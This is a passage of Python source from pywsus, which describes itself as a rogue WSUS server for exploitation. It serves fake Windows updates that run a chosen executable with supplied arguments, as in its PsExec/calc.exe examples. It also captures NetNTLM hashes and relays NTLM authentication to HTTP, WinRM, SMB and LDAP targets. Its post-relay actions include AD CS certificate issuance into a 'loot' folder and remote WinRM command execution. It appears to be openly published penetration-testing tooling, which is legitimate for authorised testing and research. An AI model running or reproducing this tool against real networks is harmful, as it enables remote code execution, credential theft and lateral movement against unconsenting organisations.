                    f"sending local NTLM Type 2 challenge {challenge.hex()} on {self.path}",  # verbose
                )
                self._send_ntlm_401(type2, proxy=proxy)
                return "handled"

            if mode in ("relay-http", "relay-winrm", "relay-smb", "relay-ldap"):
                relay_label = {
                    "relay-http": "HTTP",
                    "relay-winrm": "WinRM",
                    "relay-smb": "SMB",
                    "relay-ldap": "LDAP",
                }[mode]
                backend = None
                try:
                    backend = self.server.ntlm_relay_backend
                    type2 = backend.start_type1(session_key, token)
                    challenge = _parse_ntlm_type2_challenge(type2)
                    with self.server.ntlm_lock:
                        self.server.ntlm_sessions[session_key] = {
                            "challenge": challenge,
                            "created_at": time.time(),
                            "path": self.path,
                            "ip": ip,
                        }
                except Exception as err:
                    if backend:
                        backend.drop_session(session_key)
                    _log(0, ip, "WARN", f"{relay_label} relay Type 1 failed: {err}")
                    self._send_empty_response(502)
                    return "handled"

                _log(1, ip, "WARN",
                     f"relayed Type 1 to {relay_label} target; returning target Type 2 on {self.path}")
                self._send_ntlm_401(type2, proxy=proxy)
                return "handled"

            _log(0, ip, "WARN", f"unsupported NTLM mode for Type 1: {mode}")
            self._send_empty_response(400)
            return "handled"

        if msg_type == 3:
            try:
                parsed = _parse_ntlm_type3(token)
            except Exception as err:
                _log(0, ip, "WARN", f"failed to parse NTLM Type 3: {err}")
                self._drain_request_body()
                self._send_empty_response(400)
                return "handled"

            identity = parsed["username"]
            if parsed["domain"]:
                identity = f'{parsed["domain"]}\\{parsed["username"]}'

            session = None
            if mode in ("capture", "relay-http", "relay-winrm", "relay-smb", "relay-ldap"):
                with self.server.ntlm_lock:
                    session = self.server.ntlm_sessions.pop(session_key, None)
            challenge = session["challenge"] if session else None

            detail_parts = [
                f"identity={identity}",
                f"workstation={parsed['workstation']}",
            ]
            if challenge:
                detail_parts.append(f"challenge={challenge}")
            detail_parts.extend([
                f"nt_len={parsed['nt_response_len']}",
                f"lm_len={parsed['lm_response_len']}",
                f"flags={parsed['flags']}",
            ])
            detail = " ".join(detail_parts)

            _log(
                1, ip, "WARN", f"NTLM Type 3 authenticate received on {self.path}  {detail}"
            )
            self._ntlm_authenticated = True
            self._ntlm_identity = identity

            _emit_json_event(
                "ntlm_type3",
                ip=ip,
                path=self.path,
                mode=mode,
                identity=identity,
                workstation=parsed["workstation"],
                challenge=challenge,
                lm_response_len=parsed["lm_response_len"],
                nt_response_len=parsed["nt_response_len"],
                flags=parsed["flags"],
            )

            if challenge:
                capture = _format_ntlm_capture(parsed, challenge)
                if capture["hash"]:
                    stored_at = _store_ntlm_capture(
                        ip, self.path, mode, identity, capture
                    )
                    # Every retry produces a fresh challenge, hence a distinct hash worth
                    # storing - but logging it once per identity is enough for the operator;
                    # the rest go to the hash file quietly and stay visible under -v.
                    cap_key = (identity, capture["version"])
                    first_capture = cap_key not in _hash_logged
                    _hash_logged.add(cap_key)
                    _log(
                        0 if first_capture else 1,
                        ip,
                        "HashCapture",
                        f"{capture['version']} {identity} -> {stored_at}",
                        direction="request",
                    )

            if mode in ("relay-http", "relay-winrm", "relay-smb", "relay-ldap"):
                relay_label = {
                    "relay-http": "HTTP",
                    "relay-winrm": "WinRM",
                    "relay-smb": "SMB",
                    "relay-ldap": "LDAP",
                }[mode]
                try:
                    result = self.server.ntlm_relay_backend.finish_type3(
                        session_key,
                        token,
                        identity=identity,
                        username=parsed["username"],
                    )
                    if mode == "relay-smb":
                        share_names = ",".join(
                            share.get("name", "")
                            for share in result.get("shares", [])[:8]
                        )
                        relay_detail = (
                            f"identity={identity} "
                            f"target_status=0x{result['status']:08x} "
                            f"reason={result['reason']} "
                            f"authenticated={result['authenticated']} "
                            f"validation={result.get('auth_validation', '')} "
                            f"service={result.get('service', '')} "
                            f"service_validated={result.get('service_validated', False)} "
                            f"signing_required={result.get('smb_signing_required', '')} "
                            f"server={result.get('smb_server_name', '')} "
                            f"domain={result.get('smb_server_domain', '')} "
                            f"session_id={result.get('smb_session_id', '')} "
                            f"shares={result.get('share_count', '')} "
                            f"share_names={share_names} "
                            f"action_state={result.get('smb_action_state', '')}"
                        )
                    elif mode == "relay-ldap":
                        status = result.get("status")
                        status_text = (
                            f"0x{status:08x}"
                            if isinstance(status, int)
                            else str(status or "")
                        )
                        relay_detail = (
                            f"identity={identity} "
                            f"target_status={status_text} "
                            f"reason={result.get('reason', '')} "
                            f"authenticated={result.get('authenticated', False)} "
                            f"validation={result.get('auth_validation', '')} "
                            f"service={result.get('service', '')} "
                            f"service_validated={result.get('service_validated', False)} "
                            f"transport={result.get('ldap_transport', '')} "
                            f"rootdse={result.get('ldap_rootdse_ok', '')} "
                            f"base_dn={result.get('ldap_default_naming_context', '')} "
                            f"whoami={result.get('ldap_whoami', '')} "
                            f"action_state={result.get('ldap_action_state', '')} "
                            f"diagnostic={result.get('ldap_diagnostic_message', '') or result.get('ldap_action_error', '')}"
                        )
                    else:
                        relay_detail = (
                            f"identity={identity} "
                            f"target_status={result['status']} "
                            f"reason={result['reason']} "
                            f"authenticated={result['authenticated']} "
                            f"validation={result.get('auth_validation', '')} "
                            f"followup={result.get('followup_state', '')} "
                            f"service={result.get('service', '')} "
                            f"service_validated={result.get('service_validated', False)} "
                            f"adcs_score={result.get('adcs_score', '')} "
                            f"adcs_issued={result.get('adcs_issued', '')} "
                            f"issue_state={result.get('adcs_issue_state', '')} "
                            f"cert_id={result.get('adcs_certificate_id', '')} "
                            f"pfx={result.get('adcs_pfx_path', '')} "
                            f"debug={result.get('adcs_debug_path', '')} "
                            f"cookie={result.get('set_cookie', '') or result.get('followup_set_cookie', '')} "
                            f"content_type={result.get('content_type', '')}"
                        )
                    # Full detail stays available under -v; the default view gets a single
                    # clear outcome line instead, deduplicated so the client's retry loop
                    # does not repeat it.
                    _log(1, ip, "WARN", f"{relay_label} relay result  {relay_detail}")
                    _report_relay_outcome(ip, self.path, mode, identity, result)
                    _emit_json_event(
                        {
                            "relay-http": "http_relay_result",
                            "relay-winrm": "winrm_relay_result",
                            "relay-smb": "smb_relay_result",
                            "relay-ldap": "ldap_relay_result",
                        }[mode],
                        ip=ip,
                        path=self.path,
                        identity=identity,
                        result=result,
                    )
                except Exception as err:
                    _log(0, ip, "WARN", f"{relay_label} relay Type 3 failed: {err}")
                    _emit_json_event(
                        {
                            "relay-http": "http_relay_error",
                            "relay-winrm": "winrm_relay_error",
                            "relay-smb": "smb_relay_error",
                            "relay-ldap": "ldap_relay_error",
                        }[mode],
                        ip=ip,
                        path=self.path,
                        identity=identity,
                        error=str(err),
                    )

            # Let do_POST() read the SOAP body and send the normal WSUS XML response.
            return "continue"

        _log(0, ip, "WARN", f"unsupported NTLM message type: {msg_type}")
        self._drain_request_body()
        self._send_empty_response(400)
        return "handled"
    def _set_response(self, serveEXE=False, xml_body=None):
        self.protocol_version = 'HTTP/1.1'
        # send_response_only() emits only the status line — no Server/Date,
        # letting us place them in IIS order: Cache-Control, Content-Type,
        # Server, X-AspNet-Version, X-Powered-By, Date, Content-Length.
        self.send_response_only(200)
        self.send_header('Cache-Control', 'private')
        if serveEXE:
            self.send_header('Content-Type', 'application/octet-stream')
        else:
            self.send_header('Content-Type', 'text/xml; charset=utf-8')
        self.send_header('Server', self.version_string())
        self.send_header('X-AspNet-Version', '4.0.30319')
        self.send_header('X-Powered-By', 'ASP.NET')
        self.send_header('Date', self.date_time_string())
        if serveEXE:
            self.send_header('Content-Length', len(update_handler.executable))
        elif xml_body is not None:
            self.send_header('Content-Length', len(xml_body))
        self.end_headers()

    def do_HEAD(self):
        if (
            getattr(self.server, "ntlm_protect_downloads", False)
            and getattr(self.server, "ntlm_mode", "off") != "off"
        ):
            decision = self._ntlm_gate()
            if decision == "handled":
                return

        if ".exe" in self.path:
            _log(0, self.client_address[0], "HEAD", self.path, direction="request")
            self._set_response(True)

    def do_GET(self):
        ip = self.client_address[0]
        _log(1, ip, "WARN", f"GET {self.path}", direction="request")
        if (
            getattr(self.server, "ntlm_protect_downloads", False)
            and getattr(self.server, "ntlm_mode", "off") != "off"
        ):
            decision = self._ntlm_gate()
            if decision == "handled":
                return

        if ".exe" in self.path:
            self._set_response(True)
            try:
                self.wfile.write(update_handler.executable)
            except (ConnectionResetError, BrokenPipeError):
                _log(0, ip, "FileDownload", "connection reset (client may retry)")
                return
            size_kb = len(update_handler.executable) // 1024
            _log(0, ip, "FileDownload",
                 f"{size_kb} KB  ->  {update_handler.executable_name}",
                 direction="response")

    def do_POST(self):
        ip = self.client_address[0]
        _log(1, ip, "WARN", f"POST {self.path}", direction="request")
        if getattr(self.server, "ntlm_mode", "off") != "off":
            decision = self._ntlm_gate()
            if decision == "handled":
                return

        content_length = int(self.headers['Content-Length'])
        post_data      = self.rfile.read(content_length)
        post_data_root, parse_err = _xml_parse(post_data)
        response_xml   = None

        if parse_err:
            _log(0, ip, "WARN", f"failed to parse SOAP XML: {parse_err}")

        soap_action = self.headers['SOAPAction']
        ip          = self.client_address[0]
        action_name = soap_action.strip('"').rsplit('/', 1)[-1] if soap_action else "Unknown"

        _log_raw(f"CLIENT -> SERVER  {ip}  {action_name}",
                _xml_text(post_data),
                http_request=self.requestline)

        # --- SOAP dispatch ---

        if soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b76899b4-ad55-427d-a748-2ecf0829412b
            response_xml = update_handler.get_config_xml
            _log(0, ip, "GetConfig", direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/36a5d99a-a3ca-439d-bcc5-7325ff6b91e2
            response_xml = update_handler.get_cookie_xml
            _log(0, ip, "GetCookie", direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/RegisterComputer"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b0f2a41f-4b96-42a5-b84f-351396293033
            response_xml = update_handler.register_computer_xml

            # --- Parse client OS from computerInfo (§2.2.2.2.3) ---
            os_build = 0
            arch     = ""
            os_desc  = ""
            build_text = _xml_find_text(post_data_root, "OSBuildNumber")
            if build_text:
                try:
                    os_build = int(build_text)
                except ValueError:
                    pass
            arch = _xml_find_text(post_data_root, "ProcessorArchitecture")
            os_desc = _xml_find_text(post_data_root, "OSDescription")

            if os_build or arch or os_desc:
                update_handler.register_client(ip, os_build, arch, os_desc)

            title = update_handler.title_for_ip(ip)
            detail = f"{os_desc}  build {os_build}  arch {arch}  ->  KB{update_handler.kb_number}"
            _log(0, ip, "RegisterComputer", detail, direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/6b654980-ae63-4b0d-9fae-2abb516af894
            # Software sync -> fake updates  |  Driver sync (<SystemSpec>) -> empty
            if _xml_has_tag(post_data_root, "SystemSpec"):
                response_xml = update_handler.sync_updates_empty_xml
                _log(0, ip, "SyncUpdates", "driver sync -> empty", direction="request")
            else:
                response_xml = update_handler.sync_updates_xml
                _log(0, ip, "SyncUpdates",
                     f"KB{update_handler.kb_number}  ->  {update_handler.executable_name}",
                     direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/862adc30-a9be-4ef7-954c-13934d8c1c77
            response_xml = update_handler.get_ext_info_xml_for(ip)
            _log(0, ip, "GetExtendedUpdateInfo",
                 f"KB{update_handler.kb_number}", direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/da9f0561-1e57-4886-ad05-57696ec26a78
            response_xml = update_handler.report_event_batch_xml

            # --- Parse useful fields from ReportEventBatch ---
            parts = []
            brand = _xml_find_text(post_data_root, "ComputerBrand")
            model = _xml_find_text(post_data_root, "ComputerModel")
            hresult = _xml_find_text(post_data_root, "Win32HResult")
            repl_first = _xml_nested_text(post_data_root, "ReplacementStrings", "string")

            if brand:
                parts.append(brand)
            if model:
                parts.append(model)
            if hresult:
                hr = hresult
                parts.append(f"hr={hr}" if hr != "0" else "OK")
            if repl_first:
                kb_match = re.search(r'KB\d+', repl_first)
                if kb_match:
                    parts.append(kb_match.group())

            detail = "  ".join(parts) if parts else ""
            # The client reports an event batch every couple of seconds in a tight loop;
            # show the first from each host at level 0, the rest under -v.
            first_report = ip not in _report_batch_seen
            _report_batch_seen.add(ip)
            _log(0 if first_report else 1, ip, "ReportEventBatch", detail, direction="request")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/44767c55-1e41-4589-aa01-b306e0134744
            response_xml = update_handler.get_authorization_cookie_xml
            _log(0, ip, "GetAuthorizationCookie", direction="request")

        else:
            _log(0, ip, "WARN", f"unhandled SOAPAction: {soap_action}")
            return

        # --- Send response ---
        response_body = _xml_response_body(response_xml)
        self._set_response(xml_body=response_body)
        try:
            self.wfile.write(response_body)
        except (ConnectionResetError, BrokenPipeError):
            _log(0, ip, "WARN", f"connection reset during {action_name}")
            return

        _log_resp(ip, action_name)
        _log_raw(f"SERVER -> CLIENT  {ip}  {action_name}",
                _xml_text(response_xml),
                http_request="HTTP/1.1 200 OK")


# ---------------------------------------------------------------------------
# Server thread
# ---------------------------------------------------------------------------


def run(
    host,
    port,
    ntlm_mode="off",
    relay_target=None,
    relay_action="auth-only",
    relay_adcs_markers=None,
    adcs_template=None,
    adcs_alt_name=None,
    adcs_loot_dir="loot",
    ntlm_session_key="ip",
    ntlm_protect_downloads=False,
    relay_preflight=False,
    winrm_command=None,
):
    global _active_relay_backend

    httpd = ThreadingHTTPServer((host, port), WSUSBaseServer)
    httpd.ntlm_mode = ntlm_mode
    httpd.ntlm_sessions = {}
    httpd.ntlm_lock = threading.RLock()
    httpd.ntlm_session_key = ntlm_session_key
    httpd.ntlm_protect_downloads = ntlm_protect_downloads

    if ntlm_mode == "relay-http":
        httpd.ntlm_relay_backend = HTTPNTLMRelayBackend(
            relay_target,
            action=relay_action,
            adcs_markers=relay_adcs_markers,
            adcs_template=adcs_template,
            adcs_alt_name=adcs_alt_name,
            adcs_loot_dir=adcs_loot_dir,
        )
    elif ntlm_mode == "relay-winrm":
        httpd.ntlm_relay_backend = HTTPNTLMRelayBackend(
            relay_target,
            action=(relay_action if relay_action in ("winrm-id", "winrm-exec") else "winrm-id"),
            winrm_command=winrm_command,
        )
    elif ntlm_mode == "relay-smb":
        httpd.ntlm_relay_backend = SMBNTLMRelayBackend(
            relay_target,
            action=relay_action,
        )
    elif ntlm_mode == "relay-ldap":
        httpd.ntlm_relay_backend = LDAPNTLMRelayBackend(
            relay_target,
            action=relay_action,
        )
    else:
        httpd.ntlm_relay_backend = None

    with _active_relay_lock:
        _active_relay_backend = httpd.ntlm_relay_backend

    if relay_preflight and isinstance(httpd.ntlm_relay_backend, LDAPNTLMRelayBackend):
        try:
            preflight = httpd.ntlm_relay_backend.preflight()
            detail = (
                f"target={preflight.get('ldap_target', '')} "
                f"transport={preflight.get('ldap_transport', '')} "
                f"rootdse={preflight.get('ldap_rootdse_ok', False)} "
                f"base_dn={preflight.get('ldap_default_naming_context', '')}"
            )
            _log(0, "-", "LDAPPreflight", detail)
            _emit_json_event("ldap_relay_preflight", result=preflight)
        except Exception as err:
            _log(0, "-", "WARN", f"LDAP relay preflight failed: {err}")
            _emit_json_event("ldap_relay_preflight_error", error=str(err))

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        backend = getattr(httpd, "ntlm_relay_backend", None)
        if isinstance(backend, SMBNTLMRelayBackend):
            backend.close_live_sessions()
        with _active_relay_lock:
            if _active_relay_backend is backend:
                _active_relay_backend = None

    httpd.server_close()


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

def _print_banner(host, port, rotate_hours=0, ntlm_mode="off"):
    _console.print()
    _console.print("[bold red]p y w s u s[/]", justify="center")
    _console.print()
    rotate_tag = (
        f"  [dim]·[/]  [dim]rotate every[/] [magenta]{rotate_hours}h[/]"
        if rotate_hours else ""
    )
    smb_tag = (
        f"  [dim]·[/]  [bold white]s[/][dim]: smb sessions[/]"
        f"  [dim]·[/]  [bold white]l[/][dim]: list shares[/]"
        f"  [dim]·[/]  [bold white]x[/][dim]: close smb[/]"
        if ntlm_mode == "relay-smb" else ""
    )
    _console.print(
        f"  [dim]listening on[/] [cyan]{host}:{port}[/]"
        f"  [dim]·[/]  [bold white]q[/][dim]: quit[/]"
        f"  [dim]·[/]  [bold white]r[/][dim]: rotate session[/]"
        f"{smb_tag}"
        f"{rotate_tag}"
    )
    _console.print()


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "pywsus — Rogue WSUS server for WSUS-over-HTTP exploitation\n"
            "GoSecure | github.com/GoSecure/pywsus"
        ),
        epilog=(
            "Examples:\n"
            "  python pywsus.py -H 10.0.0.1 -p 8530 -e PsExec64.exe -c '/accepteula /s calc.exe'\n"
            "  python pywsus.py -H 10.0.0.1 -p 8530 -e PsExec64.exe -c '/accepteula' -v --log-file wsus.log\n"
            "  python pywsus.py -H 10.0.0.1 -p 8530 -e PsExec64.exe -c '/accepteula' -vv --log-file wsus.log\n"
            "  python pywsus.py -H 10.0.0.1 -p 8530 -e PsExec64.exe -c '/accepteula' -r 1\n"
            "\n"
            "Verbosity:\n"
            "  (none)  all events shown on terminal\n"
            "  -v      + metadata at startup + --log-file with directions\n"
            "  -vv     + full XML bodies in --log-file\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser._optionals.title = "OPTIONS"

    core = parser.add_argument_group("Core")
    core.add_argument('-H', '--host',       required=True,
                      help='Listening address (e.g. 0.0.0.0 or 10.0.0.1).')
    core.add_argument('-p', '--port',       type=int, default=8530,
                      help='Listening port (default: 8530).')
    core.add_argument('-e', '--executable', type=argparse.FileType('rb'), required=True,
                      help='Microsoft-signed PE to serve (e.g. PsExec64.exe).')
    core.add_argument('-c', '--command',    required=True,
                      help='Arguments passed to the executable on the client.')
    core.add_argument('-r', '--rotate',     type=float, default=0, metavar='HOURS',
                      help='Rotate session IDs every N hours (0 = off).  '
                           'Default WSUS detection frequency is ~22 h.')

    out = parser.add_argument_group("Output")
    out.add_argument('-v', '--verbose', action='count', default=0,
                     help='-v metadata + log directions. -vv + XML bodies in log.')
    out.add_argument('--log-file', metavar='FILE', default=None,
                     help='Write exchange log to FILE.')
    out.add_argument('--hash-file', metavar='FILE', default='netntlm-captures.txt',
                     help='Append formatted NetNTLM captures to FILE (default: netntlm-captures.txt).')
    out.add_argument('--json-events', metavar='FILE', default=None,
                     help='Write structured JSONL telemetry events to FILE.')
    ntlm = parser.add_argument_group("NTLM")
    ntlm.add_argument(
        "--ntlm-mode",
        choices=[
            "off",
            "challenge-only",
            "capture",
            "relay-http",
            "relay-winrm",
            "relay-smb",
            "relay-ldap",
        ],
        default="off",
        help="NTLM behavior. off = normal pyWSUS. challenge-only = stop after Type 1. capture = local Type 2/Type 3. relay-http = relay NTLM to HTTP. relay-winrm = relay NTLM to WinRM (WS-Man). relay-smb = relay NTLM to SMB. relay-ldap = relay NTLM to LDAP/LDAPS.",
    )
    ntlm.add_argument(
        "--relay-target",
        default=None,
        help="Relay target, for example http://target.lab.local/, smb://target.lab.local/, or ldap://dc.lab.local/.",
    )
    ntlm.add_argument(
        "--relay-action",
        choices=[
            "auth-only",
            "adcs-certsrv",
            "adcs-issue",
            "list-shares",
            "keep-session",
            "ldap-rootdse",
            "ldap-whoami",
            "ldap-base-search",
            "winrm-id",
            "winrm-exec",
        ],
        default="auth-only",
        help="Post-auth relay action. auth-only = bind proof. adcs-certsrv/adcs-issue = HTTP AD CS. list-shares/keep-session = SMB. ldap-* = read-only LDAP validation. winrm-id = WS-Man Identify proof. winrm-exec = run --winrm-command.",
    )
    ntlm.add_argument(
        "--winrm-command",
        default=None,
        metavar="CMD",
        help="Command run by --relay-action winrm-exec (default: whoami). Needs the WinRM target to allow unencrypted messages and the relayed identity to be WinRM-authorised.",
    )
    ntlm.add_argument(
        "--relay-adcs-marker",
        action="append",
        default=[],
        metavar="TEXT",
        help="Additional body marker that validates --relay-action adcs-certsrv. Can be repeated for lab AD CS pages.",
    )
    ntlm.add_argument(
        "--adcs-template",
        default=None,
        help="Certificate template for --relay-action adcs-issue (default: Machine for machine accounts, User otherwise).",
    )
    ntlm.add_argument(
        "--adcs-alt-name",
        default=None,
        help="Optional UPN SAN value for --relay-action adcs-issue.",
    )
    ntlm.add_argument(
        "--adcs-loot-dir",
        default="loot",
        help="Directory for issued AD CS PFX files (default: loot).",
    )
    ntlm.add_argument(
        "--ntlm-session-key",
        choices=["ip", "connection"],
        default="ip",
        help="Key NTLM sessions by client IP or by IP+source port (default: ip for single-client WUA labs).",
    )
    ntlm.add_argument(
        "--ntlm-protect-downloads",
        action="store_true",
        help="Apply the NTLM gate to GET/HEAD downloads too. Off by default to preserve normal WSUS file delivery.",
    )
    ntlm.add_argument(
        "--relay-preflight",
        action="store_true",
        help="Run an unauthenticated RootDSE preflight before accepting relay-ldap traffic.",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Session rotation  (--rotate)
# ---------------------------------------------------------------------------

def _rotate_session(executable_file, executable_name, client_address, command):
    """Rebuild update_handler with fresh IDs / KB.  Atomic swap via global."""
    global update_handler
    old_clients = update_handler._clients   # preserve known client data
    new = WSUSUpdateHandler(executable_file, executable_name, client_address)
    new.set_filedigest()
    new.set_resources_xml(command)
    new._clients.update(old_clients)        # carry over
    update_handler = new          # GIL makes this assignment atomic
    _console.rule(style="bright_black")
    _console.print(
        f"  [bold magenta]↻ Session rotated[/]  "
        f"[bold yellow]KB{new.kb_number}[/]  "
        f"[dim]rev[/] {new.revision_ids}  "
        f"[dim]dep[/] {new.deployment_ids}"
    )
    _console.rule(style="bright_black")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    args = parse_args()

    if args.ntlm_mode in ("relay-http", "relay-winrm", "relay-smb", "relay-ldap"):
        if not args.relay_target:
            _console.print(f"[bold red][ERROR][/] --relay-target is required with --ntlm-mode {args.ntlm_mode}")
            sys.exit(1)
        parsed_relay_target = urlparse(args.relay_target)
        if args.ntlm_mode == "relay-http":
            if parsed_relay_target.scheme not in ("http", "https") or not parsed_relay_target.hostname:
                _console.print("[bold red][ERROR][/] --relay-target must be http:// or https://")
                sys.exit(1)
            if args.relay_action in (
                "list-shares",
                "keep-session",
                "ldap-rootdse",
                "ldap-whoami",
                "ldap-base-search",
            ):
                _console.print(f"[bold red][ERROR][/] --relay-action {args.relay_action} does not support --ntlm-mode relay-http")
                sys.exit(1)
            if (
                args.relay_action in ("adcs-certsrv", "adcs-issue")
                and not parsed_relay_target.path.rstrip("/").lower().endswith("/certsrv")
            ):
                _console.print("[bold yellow][WARN][/] AD CS relay actions usually expect --relay-target ending in /certsrv/")
        elif args.ntlm_mode == "relay-winrm":
            if parsed_relay_target.scheme not in ("http", "https") or not parsed_relay_target.hostname:
                _console.print("[bold red][ERROR][/] --relay-target must be http://host:5985/wsman or https://host:5986/wsman with --ntlm-mode relay-winrm")
                sys.exit(1)
            if args.relay_action not in ("auth-only", "winrm-id", "winrm-exec"):
                _console.print("[bold red][ERROR][/] relay-winrm supports --relay-action winrm-id or winrm-exec")
                sys.exit(1)
            if not parsed_relay_target.path.rstrip("/").lower().endswith("/wsman"):
                _console.print("[bold yellow][WARN][/] WinRM relay usually expects --relay-target ending in /wsman")
        elif args.ntlm_mode == "relay-smb":
            if parsed_relay_target.scheme != "smb" or not parsed_relay_target.hostname:
                _console.print("[bold red][ERROR][/] --relay-target must be smb://host[:port]/ with --ntlm-mode relay-smb")
                sys.exit(1)
            if args.relay_action not in ("auth-only", "list-shares", "keep-session"):
                _console.print("[bold red][ERROR][/] relay-smb supports --relay-action auth-only, list-shares, or keep-session")
                sys.exit(1)
        else:
            if parsed_relay_target.scheme not in ("ldap", "ldaps") or not parsed_relay_target.hostname:
                _console.print("[bold red][ERROR][/] --relay-target must be ldap:// or ldaps:// with --ntlm-mode relay-ldap")
                sys.exit(1)
            if args.relay_action not in (
                "auth-only",
                "ldap-rootdse",
                "ldap-whoami",
                "ldap-base-search",
            ):
                _console.print("[bold red][ERROR][/] relay-ldap supports --relay-action auth-only, ldap-rootdse, ldap-whoami, or ldap-base-search")
                sys.exit(1)

    if args.relay_preflight and args.ntlm_mode != "relay-ldap":
        _console.print("[bold red][ERROR][/] --relay-preflight requires --ntlm-mode relay-ldap")
        sys.exit(1)

    _log_level = min(args.verbose, 2)
    _log_file  = args.log_file
    _hash_file = args.hash_file
    _json_event_file = args.json_events

    if _log_file:
        try:
            open(_log_file, "w").close()
        except OSError:
            pass

    if _json_event_file:
        try:
            open(_json_event_file, "w").close()
        except OSError:
            pass

    if _hash_file:
        try:
            with open(_hash_file, "r", encoding="utf-8") as fh:
                _hash_seen.update(line.strip() for line in fh if line.strip())
        except OSError:
            pass

    executable_file = args.executable.read()
    executable_name = os.path.basename(args.executable.name)
    args.executable.close()

    if executable_file[:2] != b'MZ':
        _console.print("[bold red][ERROR][/] Not a valid PE (missing MZ magic bytes)")
        sys.exit(1)

    update_handler = WSUSUpdateHandler(
        executable_file, executable_name,
        client_address=f'{args.host}:{args.port}')

    update_handler.set_filedigest()
    update_handler.set_resources_xml(args.command)

    _print_banner(args.host, args.port, args.rotate, args.ntlm_mode)

    if _log_level >= 1:
        _console.print(
            f"  [dim]kb[/]              [bold yellow]KB{update_handler.kb_number}[/]\n"
            f"  [dim]uuids[/]           [white]{update_handler.uuids}[/]"
            f"  [dim](Install + Bundle identifiers)[/]\n"
            f"  [dim]revision_ids[/]    [white]{update_handler.revision_ids}[/]"
            f"  [dim](revision numbers in SyncUpdates)[/]\n"
            f"  [dim]deployment_ids[/]  [white]{update_handler.deployment_ids}[/]"
            f"  [dim](deployment entries per revision)[/]\n"
            f"  [dim]sha1[/]            [white]{update_handler.sha1}[/]"
            f"  [dim](SHA-1 of payload)[/]\n"
            f"  [dim]sha256[/]          [white]{update_handler.sha256}[/]"
            f"  [dim](SHA-256 of payload)[/]"
        )
        _console.print()

    _console.print(
        f"  [bold cyan]{'Time':<10}{'Target IP':<17}{'Action':<28}Detail[/]"
    )
    _console.rule(style="bright_black")

    t = threading.Thread(
        target=run,
        args=(
            args.host,
            args.port,
            args.ntlm_mode,
            args.relay_target,
            args.relay_action,
            args.relay_adcs_marker,
            args.adcs_template,
            args.adcs_alt_name,
            args.adcs_loot_dir,
            args.ntlm_session_key,
            args.ntlm_protect_downloads,
            args.relay_preflight,
            args.winrm_command,
        ),
        daemon=True
    )
    t.start()

    rotate_secs   = args.rotate * 3600 if args.rotate else 0
    last_rotate   = time.time()
    client_addr   = f'{args.host}:{args.port}'

    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        while True:
            if rotate_secs and (time.time() - last_rotate) >= rotate_secs:
                _rotate_session(executable_file, executable_name,
                                client_addr, args.command)
                last_rotate = time.time()
            if select.select([sys.stdin], [], [], 0.5)[0]:
                key = sys.stdin.read(1).lower()
                if key == 'q':
                    break
                elif key == 'r':
                    _rotate_session(executable_file, executable_name,
                                    client_addr, args.command)
                    last_rotate = time.time()
                elif key == 's':
                    _print_smb_sessions()
                elif key == 'l':
                    _print_smb_session_shares()
                elif key == 'x':
                    _close_smb_sessions()
    except KeyboardInterrupt:
        pass
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

    _console.rule(style="bright_black")
    _console.print(
        f"  [bold red]Closed[/] [dim]port[/] [cyan]{args.port}[/]"
        f" [dim]on[/] [cyan]{args.host}[/]"
    )
    _console.print()
